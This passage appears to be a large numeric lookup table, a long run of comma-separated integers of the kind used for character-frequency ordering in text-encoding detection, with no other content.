5568,5569,1799,4732,3774,2619,4733,3641,1645,2376,4734,5570,2938, 669,2211,2675,
2434,5571,2893,5572,5573,1028,3260,5574,4372,2413,5575,2260,1353,5576,5577,4735,
3183, 518,5578,4116,5579,4373,1961,5580,2143,4374,5581,5582,3025,2354,2355,3912,
516,1834,1454,4117,2708,4375,4736,2229,2620,1972,1129,3642,5583,2776,5584,2976,
1422, 577,1470,3026,1524,3410,5585,5586, 432,4376,3074,3527,5587,2594,1455,2515,
2230,1973,1175,5588,1020,2741,4118,3528,4737,5589,2742,5590,1743,1361,3075,3529,
2649,4119,4377,4738,2295, 895, 924,4378,2171, 331,2247,3076, 166,1627,3077,1098,
5591,1232,2894,2231,3411,4739, 657, 403,1196,2377, 542,3775,3412,1600,4379,3530,
5592,4740,2777,3261, 576, 530,1362,4741,4742,2540,2676,3776,4120,5593, 842,3913,
5594,2814,2032,1014,4121, 213,2709,3413, 665, 621,4380,5595,3777,2939,2435,5596,
2436,3335,3643,3414,4743,4381,2541,4382,4744,3644,1682,4383,3531,1380,5597, 724,
2282, 600,1670,5598,1337,1233,4745,3126,2248,5599,1621,4746,5600, 651,4384,5601,
1612,4385,2621,5602,2857,5603,2743,2312,3078,5604, 716,2464,3079, 174,1255,2710,
4122,3645, 548,1320,1398, 728,4123,1574,5605,1891,1197,3080,4124,5606,3081,3082,
3778,3646,3779, 747,5607, 635,4386,4747,5608,5609,5610,4387,5611,5612,4748,5613,
3415,4749,2437, 451,5614,3780,2542,2073,4388,2744,4389,4125,5615,1764,4750,5616,
4390, 350,4751,2283,2395,2493,5617,4391,4126,2249,1434,4127, 488,4752, 458,4392,
4128,3781, 771,1330,2396,3914,2576,3184,2160,2414,1553,2677,3185,4393,5618,2494,
2895,2622,1720,2711,4394,3416,4753,5619,2543,4395,5620,3262,4396,2778,5621,2016,
2745,5622,1155,1017,3782,3915,5623,3336,2313, 201,1865,4397,1430,5624,4129,5625,
5626,5627,5628,5629,4398,1604,5630, 414,1866, 371,2595,4754,4755,3532,2017,3127,
4756,1708, 960,4399, 887, 389,2172,1536,1663,1721,5631,2232,4130,2356,2940,1580,
5632,5633,1744,4757,2544,4758,4759,5634,4760,5635,2074,5636,4761,3647,3417,2896,
4400,5637,4401,2650,3418,2815, 673,2712,2465, 709,3533,4131,3648,4402,5638,1148,
502, 634,5639,5640,1204,4762,3649,1575,4763,2623,3783,5641,3784,3128, 948,3263,
121,1745,3916,1110,5642,4403,3083,2516,3027,4132,3785,1151,1771,3917,1488,4133,
1987,5643,2438,3534,5644,5645,2094,5646,4404,3918,1213,1407,2816, 531,2746,2545,
3264,1011,1537,4764,2779,4405,3129,1061,5647,3786,3787,1867,2897,5648,2018, 120,
4406,4407,2063,3650,3265,2314,3919,2678,3419,1955,4765,4134,5649,3535,1047,2713,
1266,5650,1368,4766,2858, 649,3420,3920,2546,2747,1102,2859,2679,5651,5652,2000,
5653,1111,3651,2977,5654,2495,3921,3652,2817,1855,3421,3788,5655,5656,3422,2415,
2898,3337,3266,3653,5657,2577,5658,3654,2818,4135,1460, 856,5659,3655,5660,2899,
2978,5661,2900,3922,5662,4408, 632,2517, 875,3923,1697,3924,2296,5663,5664,4767,
3028,1239, 580,4768,4409,5665, 914, 936,2075,1190,4136,1039,2124,5666,5667,5668,
5669,3423,1473,5670,1354,4410,3925,4769,2173,3084,4137, 915,3338,4411,4412,3339,
1605,1835,5671,2748, 398,3656,4413,3926,4138, 328,1913,2860,4139,3927,1331,4414,
3029, 937,4415,5672,3657,4140,4141,3424,2161,4770,3425, 524, 742, 538,3085,1012,
5673,5674,3928,2466,5675, 658,1103, 225,3929,5676,5677,4771,5678,4772,5679,3267,
1243,5680,4142, 963,2250,4773,5681,2714,3658,3186,5682,5683,2596,2332,5684,4774,
5685,5686,5687,3536, 957,3426,2547,2033,1931,2941,2467, 870,2019,3659,1746,2780,
2781,2439,2468,5688,3930,5689,3789,3130,3790,3537,3427,3791,5690,1179,3086,5691,
3187,2378,4416,3792,2548,3188,3131,2749,4143,5692,3428,1556,2549,2297, 977,2901,
2034,4144,1205,3429,5693,1765,3430,3189,2125,1271, 714,1689,4775,3538,5694,2333,
3931, 533,4417,3660,2184, 617,5695,2469,3340,3539,2315,5696,5697,3190,5698,5699,
3932,1988, 618, 427,2651,3540,3431,5700,5701,1244,1690,5702,2819,4418,4776,5703,
3541,4777,5704,2284,1576, 473,3661,4419,3432, 972,5705,3662,5706,3087,5707,5708,
4778,4779,5709,3793,4145,4146,5710, 153,4780, 356,5711,1892,2902,4420,2144, 408,
803,2357,5712,3933,5713,4421,1646,2578,2518,4781,4782,3934,5714,3935,4422,5715,
2416,3433, 752,5716,5717,1962,3341,2979,5718, 746,3030,2470,4783,4423,3794, 698,
4784,1893,4424,3663,2550,4785,3664,3936,5719,3191,3434,5720,1824,1302,4147,2715,
3937,1974,4425,5721,4426,3192, 823,1303,1288,1236,2861,3542,4148,3435, 774,3938,
5722,1581,4786,1304,2862,3939,4787,5723,2440,2162,1083,3268,4427,4149,4428, 344,
1173, 288,2316, 454,1683,5724,5725,1461,4788,4150,2597,5726,5727,4789, 985, 894,
5728,3436,3193,5729,1914,2942,3795,1989,5730,2111,1975,5731,4151,5732,2579,1194,
425,5733,4790,3194,1245,3796,4429,5734,5735,2863,5736, 636,4791,1856,3940, 760,
1800,5737,4430,2212,1508,4792,4152,1894,1684,2298,5738,5739,4793,4431,4432,2213,
479,5740,5741, 832,5742,4153,2496,5743,2980,2497,3797, 990,3132, 627,1815,2652,
4433,1582,4434,2126,2112,3543,4794,5744, 799,4435,3195,5745,4795,2113,1737,3031,
1018, 543, 754,4436,3342,1676,4796,4797,4154,4798,1489,5746,3544,5747,2624,2903,
4155,5748,5749,2981,5750,5751,5752,5753,3196,4799,4800,2185,1722,5754,3269,3270,
1843,3665,1715, 481, 365,1976,1857,5755,5756,1963,2498,4801,5757,2127,3666,3271,
433,1895,2064,2076,5758, 602,2750,5759,5760,5761,5762,5763,3032,1628,3437,5764,
3197,4802,4156,2904,4803,2519,5765,2551,2782,5766,5767,5768,3343,4804,2905,5769,
4805,5770,2864,4806,4807,1221,2982,4157,2520,5771,5772,5773,1868,1990,5774,5775,
5776,1896,5777,5778,4808,1897,4158, 318,5779,2095,4159,4437,5780,5781, 485,5782,
938,3941, 553,2680, 116,5783,3942,3667,5784,3545,2681,2783,3438,3344,2820,5785,
3668,2943,4160,1747,2944,2983,5786,5787, 207,5788,4809,5789,4810,2521,5790,3033,
890,3669,3943,5791,1878,3798,3439,5792,2186,2358,3440,1652,5793,5794,5795, 941,
2299, 208,3546,4161,2020, 330,4438,3944,2906,2499,3799,4439,4811,5796,5797,5798,
2522,1613,4812,5799,3345,3945,2523,5800,4162,5801,1637,4163,2471,4813,3946,5802,
2500,3034,3800,5803,5804,2195,4814,5805,2163,5806,5807,5808,5809,5810,5811,5812,
5813,5814,5815,5816,5817,5818,5819,5820,5821,5822,5823,5824,5825,5826,5827,5828,
5829,5830,5831,5832,5833,5834,5835,5836,5837,5838,5839,5840,5841,5842,5843,5844,
5845,5846,5847,5848,5849,5850,5851,5852,5853,5854,5855,5856,5857,5858,5859,5860,
5861,5862,5863,5864,5865,5866,5867,5868,5869,5870,5871,5872,5873,5874,5875,5876,
5877,5878,5879,5880,5881,5882,5883,5884,5885,5886,5887,5888,5889,5890,5891,5892,
5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904,5905,5906,5907,5908,
5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920,5921,5922,5923,5924,
5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,5936,5937,5938,5939,5940,
5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,5952,5953,5954,5955,5956,
5957,5958,5959,5960,5961,5962,5963,5964,5965,5966,5967,5968,5969,5970,5971,5972,
5973,5974,5975,5976,5977,5978,5979,5980,5981,5982,5983,5984,5985,5986,5987,5988,
5989,5990,5991,5992,5993,5994,5995,5996,5997,5998,5999,6000,6001,6002,6003,6004,
6005,6006,6007,6008,6009,6010,6011,6012,6013,6014,6015,6016,6017,6018,6019,6020,
6021,6022,6023,6024,6025,6026,6027,6028,6029,6030,6031,6032,6033,6034,6035,6036,
6037,6038,6039,6040,6041,6042,6043,6044,6045,6046,6047,6048,6049,6050,6051,6052,
6053,6054,6055,6056,6057,6058,6059,6060,6061,6062,6063,6064,6065,6066,6067,6068,
6069,6070,6071,6072,6073,6074,6075,6076,6077,6078,6079,6080,6081,6082,6083,6084,
6085,6086,6087,6088,6089,6090,6091,6092,6093,6094,6095,6096,6097,6098,6099,6100,
6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6111,6112,6113,6114,6115,6116,
6117,6118,6119,6120,6121,6122,6123,6124,6125,6126,6127,6128,6129,6130,6131,6132,
6133,6134,6135,6136,6137,6138,6139,6140,6141,6142,6143,6144,6145,6146,6147,6148,
6149,6150,6151,6152,6153,6154,6155,6156,6157,6158,6159,6160,6161,6162,6163,6164,
6165,6166,6167,6168,6169,6170,6171,6172,6173,6174,6175,6176,6177,6178,6179,6180,
6181,6182,6183,6184,6185,6186,6187,6188,6189,6190,6191,6192,6193,6194,6195,6196,
6197,6198,6199,6200,6201,6202,6203,6204,6205,6206,6207,6208,6209,6210,6211,6212,
6213,6214,6215,6216,6217,6218,6219,6220,6221,6222,6223,3670,6224,6225,6226,6227,
6228,6229,6230,6231,6232,6233,6234,6235,6236,6237,6238,6239,6240,6241,6242,6243,
6244,6245,6246,6247,6248,6249,6250,6251,6252,6253,6254,6255,6256,6257,6258,6259,
6260,6261,6262,6263,6264,6265,6266,6267,6268,6269,6270,6271,6272,6273,6274,6275,
6276,6277,6278,6279,6280,6281,6282,6283,6284,6285,4815,6286,6287,6288,6289,6290,
6291,6292,4816,6293,6294,6295,6296,6297,6298,6299,6300,6301,6302,6303,6304,6305,
6306,6307,6308,6309,6310,6311,4817,4818,6312,6313,6314,6315,6316,6317,6318,4819,
6319,6320,6321,6322,6323,6324,6325,6326,6327,6328,6329,6330,6331,6332,6333,6334,
6335,6336,6337,4820,6338,6339,6340,6341,6342,6343,6344,6345,6346,6347,6348,6349,
6350,6351,6352,6353,6354,6355,6356,6357,6358,6359,6360,6361,6362,6363,6364,6365,
6366,6367,6368,6369,6370,6371,6372,6373,6374,6375,6376,6377,6378,6379,6380,6381,
6382,6383,6384,6385,6386,6387,6388,6389,6390,6391,6392,6393,6394,6395,6396,6397,
6398,6399,6400,6401,6402,6403,6404,6405,6406,6407,6408,6409,6410,3441,6411,6412,
6413,6414,6415,6416,6417,6418,6419,6420,6421,6422,6423,6424,6425,4440,6426,6427,
6428,6429,6430,6431,6432,6433,6434,6435,6436,6437,6438,6439,6440,6441,6442,6443,
6444,6445,6446,6447,6448,6449,6450,6451,6452,6453,6454,4821,6455,6456,6457,6458,
6459,6460,6461,6462,6463,6464,6465,6466,6467,6468,6469,6470,6471,6472,6473,6474,
6475,6476,6477,3947,3948,6478,6479,6480,6481,3272,4441,6482,6483,6484,6485,4442,
6486,6487,6488,6489,6490,6491,6492,6493,6494,6495,6496,4822,6497,6498,6499,6500,
6501,6502,6503,6504,6505,6506,6507,6508,6509,6510,6511,6512,6513,6514,6515,6516,
6517,6518,6519,6520,6521,6522,6523,6524,6525,6526,6527,6528,6529,6530,6531,6532,
6533,6534,6535,6536,6537,6538,6539,6540,6541,6542,6543,6544,6545,6546,6547,6548,
6549,6550,6551,6552,6553,6554,6555,6556,2784,6557,4823,6558,6559,6560,6561,6562,
6563,6564,6565,6566,6567,6568,6569,3949,6570,6571,6572,4824,6573,6574,6575,6576,
6577,6578,6579,6580,6581,6582,6583,4825,6584,6585,6586,3950,2785,6587,6588,6589,
6590,6591,6592,6593,6594,6595,6596,6597,6598,6599,6600,6601,6602,6603,6604,6605,
6606,6607,6608,6609,6610,6611,6612,4826,6613,6614,6615,4827,6616,6617,6618,6619,
6620,6621,6622,6623,6624,6625,4164,6626,6627,6628,6629,6630,6631,6632,6633,6634,
3547,6635,4828,6636,6637,6638,6639,6640,6641,6642,3951,2984,6643,6644,6645,6646,
6647,6648,6649,4165,6650,4829,6651,6652,4830,6653,6654,6655,6656,6657,6658,6659,
6660,6661,6662,4831,6663,6664,6665,6666,6667,6668,6669,6670,6671,4166,6672,4832,
3952,6673,6674,6675,6676,4833,6677,6678,6679,4167,6680,6681,6682,3198,6683,6684,
6685,6686,6687,6688,6689,6690,6691,6692,6693,6694,6695,6696,6697,4834,6698,6699,
6700,6701,6702,6703,6704,6705,6706,6707,6708,6709,6710,6711,6712,6713,6714,6715,
6716,6717,6718,6719,6720,6721,6722,6723,6724,6725,6726,6727,6728,6729,6730,6731,
6732,6733,6734,4443,6735,6736,6737,6738,6739,6740,6741,6742,6743,6744,6745,4444,
6746,6747,6748,6749,6750,6751,6752,6753,6754,6755,6756,6757,6758,6759,6760,6761,
6762,6763,6764,6765,6766,6767,6768,6769,6770,6771,6772,6773,6774,6775,6776,6777,
6778,6779,6780,6781,4168,6782,6783,3442,6784,6785,6786,6787,6788,6789,6790,6791,
4169,6792,6793,6794,6795,6796,6797,6798,6799,6800,6801,6802,6803,6804,6805,6806,
6807,6808,6809,6810,6811,4835,6812,6813,6814,4445,6815,6816,4446,6817,6818,6819,
6820,6821,6822,6823,6824,6825,6826,6827,6828,6829,6830,6831,6832,6833,6834,6835,
3548,6836,6837,6838,6839,6840,6841,6842,6843,6844,6845,6846,4836,6847,6848,6849,
6850,6851,6852,6853,6854,3953,6855,6856,6857,6858,6859,6860,6861,6862,6863,6864,
6865,6866,6867,6868,6869,6870,6871,6872,6873,6874,6875,6876,6877,3199,6878,6879,
6880,6881,6882,4447,6883,6884,6885,6886,6887,6888,6889,6890,6891,6892,6893,6894,
6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,4170,6905,6906,6907,6908,6909,
6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,
6926,6927,4837,6928,6929,6930,6931,6932,6933,6934,6935,6936,3346,6937,6938,4838,
6939,6940,6941,4448,6942,6943,6944,6945,6946,4449,6947,6948,6949,6950,6951,6952,
6953,6954,6955,6956,6957,6958,6959,6960,6961,6962,6963,6964,6965,6966,6967,6968,
6969,6970,6971,6972,6973,6974,6975,6976,6977,6978,6979,6980,6981,6982,6983,6984,
6985,6986,6987,6988,6989,6990,6991,6992,6993,6994,3671,6995,6996,6997,6998,4839,
6999,7000,7001,7002,3549,7003,7004,7005,7006,7007,7008,7009,7010,7011,7012,7013,
7014,7015,7016,7017,7018,7019,7020,7021,7022,7023,7024,7025,7026,7027,7028,7029,
7030,4840,7031,7032,7033,7034,7035,7036,7037,7038,4841,7039,7040,7041,7042,7043,
7044,7045,7046,7047,7048,7049,7050,7051,7052,7053,7054,7055,7056,7057,7058,7059,
7060,7061,7062,7063,7064,7065,7066,7067,7068,7069,7070,2985,7071,7072,7073,7074,
7075,7076,7077,7078,7079,7080,4842,7081,7082,7083,7084,7085,7086,7087,7088,7089,
7090,7091,7092,7093,7094,7095,7096,7097,7098,7099,7100,7101,7102,7103,7104,7105,
7106,7107,7108,7109,7110,7111,7112,7113,7114,7115,7116,7117,7118,4450,7119,7120,
7121,7122,7123,7124,7125,7126,7127,7128,7129,7130,7131,7132,7133,7134,7135,7136,
7137,7138,7139,7140,7141,7142,7143,4843,7144,7145,7146,7147,7148,7149,7150,7151,
7152,7153,7154,7155,7156,7157,7158,7159,7160,7161,7162,7163,7164,7165,7166,7167,
7168,7169,7170,7171,7172,7173,7174,7175,7176,7177,7178,7179,7180,7181,7182,7183,
7184,7185,7186,7187,7188,4171,4172,7189,7190,7191,7192,7193,7194,7195,7196,7197,
7198,7199,7200,7201,7202,7203,7204,7205,7206,7207,7208,7209,7210,7211,7212,7213,
7214,7215,7216,7217,7218,7219,7220,7221,7222,7223,7224,7225,7226,7227,7228,7229,
7230,7231,7232,7233,7234,7235,7236,7237,7238,7239,7240,7241,7242,7243,7244,7245,
7246,7247,7248,7249,7250,7251,7252,7253,7254,7255,7256,7257,7258,7259,7260,7261,
7262,7263,7264,7265,7266,7267,7268,7269,7270,7271,7272,7273,7274,7275,7276,7277,
7278,7279,7280,7281,7282,7283,7284,7285,7286,7287,7288,7289,7290,7291,7292,7293,
7294,7295,7296,4844,7297,7298,7299,7300,7301,7302,7303,7304,7305,7306,7307,7308,
7309,7310,7311,7312,7313,7314,7315,7316,4451,7317,7318,7319,7320,7321,7322,7323,
7324,7325,7326,7327,7328,7329,7330,7331,7332,7333,7334,7335,7336,7337,7338,7339,
7340,7341,7342,7343,7344,7345,7346,7347,7348,7349,7350,7351,7352,7353,4173,7354,
7355,4845,7356,7357,7358,7359,7360,7361,7362,7363,7364,7365,7366,7367,7368,7369,
7370,7371,7372,7373,7374,7375,7376,7377,7378,7379,7380,7381,7382,7383,7384,7385,
7386,7387,7388,4846,7389,7390,7391,7392,7393,7394,7395,7396,7397,7398,7399,7400,
7401,7402,7403,7404,7405,3672,7406,7407,7408,7409,7410,7411,7412,7413,7414,7415,
7416,7417,7418,7419,7420,7421,7422,7423,7424,7425,7426,7427,7428,7429,7430,7431,
7432,7433,7434,7435,7436,7437,7438,7439,7440,7441,7442,7443,7444,7445,7446,7447,
7448,7449,7450,7451,7452,7453,4452,7454,3200,7455,7456,7457,7458,7459,7460,7461,
7462,7463,7464,7465,7466,7467,7468,7469,7470,7471,7472,7473,7474,4847,7475,7476,
7477,3133,7478,7479,7480,7481,7482,7483,7484,7485,7486,7487,7488,7489,7490,7491,
7492,7493,7494,7495,7496,7497,7498,7499,7500,7501,7502,3347,7503,7504,7505,7506,
7507,7508,7509,7510,7511,7512,7513,7514,7515,7516,7517,7518,7519,7520,7521,4848,
7522,7523,7524,7525,7526,7527,7528,7529,7530,7531,7532,7533,7534,7535,7536,7537,
7538,7539,7540,7541,7542,7543,7544,7545,7546,7547,7548,7549,3801,4849,7550,7551,
7552,7553,7554,7555,7556,7557,7558,7559,7560,7561,7562,7563,7564,7565,7566,7567,
7568,7569,3035,7570,7571,7572,7573,7574,7575,7576,7577,7578,7579,7580,7581,7582,
7583,7584,7585,7586,7587,7588,7589,7590,7591,7592,7593,7594,7595,7596,7597,7598,
7599,7600,7601,7602,7603,7604,7605,7606,7607,7608,7609,7610,7611,7612,7613,7614,
7615,7616,4850,7617,7618,3802,7619,7620,7621,7622,7623,7624,7625,7626,7627,7628,
7629,7630,7631,7632,4851,7633,7634,7635,7636,7637,7638,7639,7640,7641,7642,7643,
7644,7645,7646,7647,7648,7649,7650,7651,7652,7653,7654,7655,7656,7657,7658,7659,
7660,7661,7662,7663,7664,7665,7666,7667,7668,7669,7670,4453,7671,7672,7673,7674,
7675,7676,7677,7678,7679,7680,7681,7682,7683,7684,7685,7686,7687,7688,7689,7690,
7691,7692,7693,7694,7695,7696,7697,3443,7698,7699,7700,7701,7702,4454,7703,7704,
7705,7706,7707,7708,7709,7710,7711,7712,7713,2472,7714,7715,7716,7717,7718,7719,
7720,7721,7722,7723,7724,7725,7726,7727,7728,7729,7730,7731,3954,7732,7733,7734,
7735,7736,7737,7738,7739,7740,7741,7742,7743,7744,7745,7746,7747,7748,7749,7750,
3134,7751,7752,4852,7753,7754,7755,4853,7756,7757,7758,7759,7760,4174,7761,7762,
7763,7764,7765,7766,7767,7768,7769,7770,7771,7772,7773,7774,7775,7776,7777,7778,
7779,7780,7781,7782,7783,7784,7785,7786,7787,7788,7789,7790,7791,7792,7793,7794,
7795,7796,7797,7798,7799,7800,7801,7802,7803,7804,7805,4854,7806,7807,7808,7809,
7810,7811,7812,7813,7814,7815,7816,7817,7818,7819,7820,7821,7822,7823,7824,7825,
4855,7826,7827,7828,7829,7830,7831,7832,7833,7834,7835,7836,7837,7838,7839,7840,
7841,7842,7843,7844,7845,7846,7847,3955,7848,7849,7850,7851,7852,7853,7854,7855,
7856,7857,7858,7859,7860,3444,7861,7862,7863,7864,7865,7866,7867,7868,7869,7870,
7871,7872,7873,7874,7875,7876,7877,7878,7879,7880,7881,7882,7883,7884,7885,7886,
7887,7888,7889,7890,7891,4175,7892,7893,7894,7895,7896,4856,4857,7897,7898,7899,
7900,2598,7901,7902,7903,7904,7905,7906,7907,7908,4455,7909,7910,7911,7912,7913,
7914,3201,7915,7916,7917,7918,7919,7920,7921,4858,7922,7923,7924,7925,7926,7927,
7928,7929,7930,7931,7932,7933,7934,7935,7936,7937,7938,7939,7940,7941,7942,7943,
7944,7945,7946,7947,7948,7949,7950,7951,7952,7953,7954,7955,7956,7957,7958,7959,
7960,7961,7962,7963,7964,7965,7966,7967,7968,7969,7970,7971,7972,7973,7974,7975,
7976,7977,7978,7979,7980,7981,4859,7982,7983,7984,7985,7986,7987,7988,7989,7990,
7991,7992,7993,7994,7995,7996,4860,7997,7998,7999,8000,8001,8002,8003,8004,8005,
8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,8016,4176,8017,8018,8019,8020,
8021,8022,8023,4861,8024,8025,8026,8027,8028,8029,8030,8031,8032,8033,8034,8035,
8036,4862,4456,8037,8038,8039,8040,4863,8041,8042,8043,8044,8045,8046,8047,8048,
8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,8064,
8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,8080,
8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,
8097,8098,8099,4864,4177,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,
8111,8112,8113,8114,8115,8116,8117,8118,8119,8120,4178,8121,8122,8123,8124,8125,
8126,8127,8128,8129,8130,8131,8132,8133,8134,8135,8136,8137,8138,8139,8140,8141,
8142,8143,8144,8145,4865,4866,8146,8147,8148,8149,8150,8151,8152,8153,8154,8155,
8156,8157,8158,8159,8160,8161,8162,8163,8164,8165,4179,8166,8167,8168,8169,8170,
8171,8172,8173,8174,8175,8176,8177,8178,8179,8180,8181,4457,8182,8183,8184,8185,
8186,8187,8188,8189,8190,8191,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,
8202,8203,8204,8205,8206,8207,8208,8209,8210,8211,8212,8213,8214,8215,8216,8217,
8218,8219,8220,8221,8222,8223,8224,8225,8226,8227,8228,8229,8230,8231,8232,8233,
8234,8235,8236,8237,8238,8239,8240,8241,8242,8243,8244,8245,8246,8247,8248,8249,
8250,8251,8252,8253,8254,8255,8256,3445,8257,8258,8259,8260,8261,8262,4458,8263,
8264,8265,8266,8267,8268,8269,8270,8271,8272,4459,8273,8274,8275,8276,3550,8277,
8278,8279,8280,8281,8282,8283,8284,8285,8286,8287,8288,8289,4460,8290,8291,8292,
8293,8294,8295,8296,8297,8298,8299,8300,8301,8302,8303,8304,8305,8306,8307,4867,
8308,8309,8310,8311,8312,3551,8313,8314,8315,8316,8317,8318,8319,8320,8321,8322,
8323,8324,8325,8326,4868,8327,8328,8329,8330,8331,8332,8333,8334,8335,8336,8337,
8338,8339,8340,8341,8342,8343,8344,8345,8346,8347,8348,8349,8350,8351,8352,8353,
8354,8355,8356,8357,8358,8359,8360,8361,8362,8363,4869,4461,8364,8365,8366,8367,
8368,8369,8370,4870,8371,8372,8373,8374,8375,8376,8377,8378,8379,8380,8381,8382,
8383,8384,8385,8386,8387,8388,8389,8390,8391,8392,8393,8394,8395,8396,8397,8398,
8399,8400,8401,8402,8403,8404,8405,8406,8407,8408,8409,8410,4871,8411,8412,8413,
8414,8415,8416,8417,8418,8419,8420,8421,8422,4462,8423,8424,8425,8426,8427,8428,
8429,8430,8431,8432,8433,2986,8434,8435,8436,8437,8438,8439,8440,8441,8442,8443,
8444,8445,8446,8447,8448,8449,8450,8451,8452,8453,8454,8455,8456,8457,8458,8459,
8460,8461,8462,8463,8464,8465,8466,8467,8468,8469,8470,8471,8472,8473,8474,8475,
8476,8477,8478,4180,8479,8480,8481,8482,8483,8484,8485,8486,8487,8488,8489,8490,
8491,8492,8493,8494,8495,8496,8497,8498,8499,8500,8501,8502,8503,8504,8505,8506,
8507,8508,8509,8510,8511,8512,8513,8514,8515,8516,8517,8518,8519,8520,8521,8522,
8523,8524,8525,8526,8527,8528,8529,8530,8531,8532,8533,8534,8535,8536,8537,8538,
8539,8540,8541,8542,8543,8544,8545,8546,8547,8548,8549,8550,8551,8552,8553,8554,
8555,8556,8557,8558,8559,8560,8561,8562,8563,8564,4872,8565,8566,8567,8568,8569,
8570,8571,8572,8573,4873,8574,8575,8576,8577,8578,8579,8580,8581,8582,8583,8584,
8585,8586,8587,8588,8589,8590,8591,8592,8593,8594,8595,8596,8597,8598,8599,8600,
8601,8602,8603,8604,8605,3803,8606,8607,8608,8609,8610,8611,8612,8613,4874,3804,
8614,8615,8616,8617,8618,8619,8620,8621,3956,8622,8623,8624,8625,8626,8627,8628,
8629,8630,8631,8632,8633,8634,8635,8636,8637,8638,2865,8639,8640,8641,8642,8643,
8644,8645,8646,8647,8648,8649,8650,8651,8652,8653,8654,8655,8656,4463,8657,8658,
8659,4875,4876,8660,8661,8662,8663,8664,8665,8666,8667,8668,8669,8670,8671,8672,
8673,8674,8675,8676,8677,8678,8679,8680,8681,4464,8682,8683,8684,8685,8686,8687,
8688,8689,8690,8691,8692,8693,8694,8695,8696,8697,8698,8699,8700,8701,8702,8703,
8704,8705,8706,8707,8708,8709,2261,8710,8711,8712,8713,8714,8715,8716,8717,8718,
8719,8720,8721,8722,8723,8724,8725,8726,8727,8728,8729,8730,8731,8732,8733,4181,
8734,8735,8736,8737,8738,8739,8740,8741,8742,8743,8744,8745,8746,8747,8748,8749,
8750,8751,8752,8753,8754,8755,8756,8757,8758,8759,8760,8761,8762,8763,4877,8764,
8765,8766,8767,8768,8769,8770,8771,8772,8773,8774,8775,8776,8777,8778,8779,8780,
8781,8782,8783,8784,8785,8786,8787,8788,4878,8789,4879,8790,8791,8792,4880,8793,
8794,8795,8796,8797,8798,8799,8800,8801,4881,8802,8803,8804,8805,8806,8807,8808,
8809,8810,8811,8812,8813,8814,8815,3957,8816,8817,8818,8819,8820,8821,8822,8823,
8824,8825,8826,8827,8828,8829,8830,8831,8832,8833,8834,8835,8836,8837,8838,8839,
8840,8841,8842,8843,8844,8845,8846,8847,4882,8848,8849,8850,8851,8852,8853,8854,
8855,8856,8857,8858,8859,8860,8861,8862,8863,8864,8865,8866,8867,8868,8869,8870,
8871,8872,8873,8874,8875,8876,8877,8878,8879,8880,8881,8882,8883,8884,3202,8885,
8886,8887,8888,8889,8890,8891,8892,8893,8894,8895,8896,8897,8898,8899,8900,8901,
8902,8903,8904,8905,8906,8907,8908,8909,8910,8911,8912,8913,8914,8915,8916,8917,
8918,8919,8920,8921,8922,8923,8924,4465,8925,8926,8927,8928,8929,8930,8931,8932,
4883,8933,8934,8935,8936,8937,8938,8939,8940,8941,8942,8943,2214,8944,8945,8946,
8947,8948,8949,8950,8951,8952,8953,8954,8955,8956,8957,8958,8959,8960,8961,8962,
8963,8964,8965,4884,8966,8967,8968,8969,8970,8971,8972,8973,8974,8975,8976,8977,
8978,8979,8980,8981,8982,8983,8984,8985,8986,8987,8988,8989,8990,8991,8992,4885,
8993,8994,8995,8996,8997,8998,8999,9000,9001,9002,9003,9004,9005,9006,9007,9008,
9009,9010,9011,9012,9013,9014,9015,9016,9017,9018,9019,9020,9021,4182,9022,9023,
9024,9025,9026,9027,9028,9029,9030,9031,9032,9033,9034,9035,9036,9037,9038,9039,
9040,9041,9042,9043,9044,9045,9046,9047,9048,9049,9050,9051,9052,9053,9054,9055,
9056,9057,9058,9059,9060,9061,9062,9063,4886,9064,9065,9066,9067,9068,9069,4887,
9070,9071,9072,9073,9074,9075,9076,9077,9078,9079,9080,9081,9082,9083,9084,9085,
9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9101,
9102,9103,9104,9105,9106,9107,9108,9109,9110,9111,9112,9113,9114,9115,9116,9117,
9118,9119,9120,9121,9122,9123,9124,9125,9126,9127,9128,9129,9130,9131,9132,9133,
9134,9135,9136,9137,9138,9139,9140,9141,3958,9142,9143,9144,9145,9146,9147,9148,
9149,9150,9151,4888,9152,9153,9154,9155,9156,9157,9158,9159,9160,9161,9162,9163,
9164,9165,9166,9167,9168,9169,9170,9171,9172,9173,9174,9175,4889,9176,9177,9178,
9179,9180,9181,9182,9183,9184,9185,9186,9187,9188,9189,9190,9191,9192,9193,9194,
9195,9196,9197,9198,9199,9200,9201,9202,9203,4890,9204,9205,9206,9207,9208,9209,
9210,9211,9212,9213,9214,9215,9216,9217,9218,9219,9220,9221,9222,4466,9223,9224,
9225,9226,9227,9228,9229,9230,9231,9232,9233,9234,9235,9236,9237,9238,9239,9240,
9241,9242,9243,9244,9245,4891,9246,9247,9248,9249,9250,9251,9252,9253,9254,9255,
9256,9257,4892,9258,9259,9260,9261,4893,4894,9262,9263,9264,9265,9266,9267,9268,
9269,9270,9271,9272,9273,4467,9274,9275,9276,9277,9278,9279,9280,9281,9282,9283,
9284,9285,3673,9286,9287,9288,9289,9290,9291,9292,9293,9294,9295,9296,9297,9298,
9299,9300,9301,9302,9303,9304,9305,9306,9307,9308,9309,9310,9311,9312,9313,9314,
9315,9316,9317,9318,9319,9320,9321,9322,4895,9323,9324,9325,9326,9327,9328,9329,
9330,9331,9332,9333,9334,9335,9336,9337,9338,9339,9340,9341,9342,9343,9344,9345,
9346,9347,4468,9348,9349,9350,9351,9352,9353,9354,9355,9356,9357,9358,9359,9360,
9361,9362,9363,9364,9365,9366,9367,9368,9369,9370,9371,9372,9373,4896,9374,4469,
9375,9376,9377,9378,9379,4897,9380,9381,9382,9383,9384,9385,9386,9387,9388,9389,
